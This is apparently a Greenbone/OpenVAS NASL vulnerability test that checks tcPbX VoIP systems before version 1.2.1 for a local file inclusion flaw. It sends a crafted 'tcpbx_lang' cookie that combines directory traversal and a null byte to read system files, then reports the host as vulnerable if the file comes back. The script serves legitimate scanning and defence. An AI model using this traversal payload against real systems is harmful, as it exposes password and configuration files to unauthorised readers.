CPE = "cpe:/a:tcpbx:tcpbx_voip";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.809009" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)" );
	script_name( "tcPbX 'tcpbx_lang' Parameter Local File Inclusion Vulnerability" );
	script_tag( name: "summary", value: "The host is running tcPbX VoIP phone system
  and is prone to local file disclosure vulnerability" );
	script_tag( name: "vuldetect", value: "Send the crafted http GET request
  and check whether it is able to get password information or not." );
	script_tag( name: "insight", value: "The flaw exists due to 'tcpbx_lang'
  parameter isn't sanitized before being proceeded in the file
  'var/www/html/tcpbx/index.php'." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read any file system including file configurations." );
	script_tag( name: "affected", value: "tcPbX versions prior to 1.2.1." );
	script_tag( name: "solution", value: "Update to version 1.2.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40278" );
	script_xref( name: "URL", value: "http://www.tcpbx.org/index.php/en/resources/updates" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_tcpbx_voip_remote_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "tcPbX/Installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!iqPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/tcpbx/";
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	cookie = "tcpbx_lang=../../../../../../../../../../" + file + "%00; PHPSESSID=7rmen68sn4op8cgkc49l86pfu4";
	if(http_vuln_check( port: iqPort, url: url, check_header: TRUE, pattern: pattern, cookie: cookie, extra_check: make_list( ">www.tcpbx.org",
		 "<title>tcPbX</title>" ) )){
		report = http_report_vuln_url( port: iqPort, url: url );
		security_message( port: iqPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

